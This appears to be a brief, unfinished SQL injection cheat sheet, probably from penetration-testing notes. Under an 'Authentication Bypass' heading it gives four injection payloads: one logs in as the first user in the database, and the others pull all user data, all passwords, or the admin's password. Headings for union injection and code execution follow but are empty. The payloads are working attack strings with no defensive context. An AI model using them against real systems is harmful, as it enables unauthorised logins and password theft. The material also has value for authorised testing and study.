#### Authentication Bypass

```
#Standard auth bypass will log in as the first user in the database table.
' OR 1=1 -- //

#Select all data from table users.
' OR 1=1 in (SELECT * FROM users) -- //

#Select all passwords from table users.
' or 1=1 in (SELECT password FROM users) -- //

#Select all 
' or 1=1 in (SELECT password FROM users WHERE username = 'admin') -- //
```
#### Union Injection

#### Code Execution

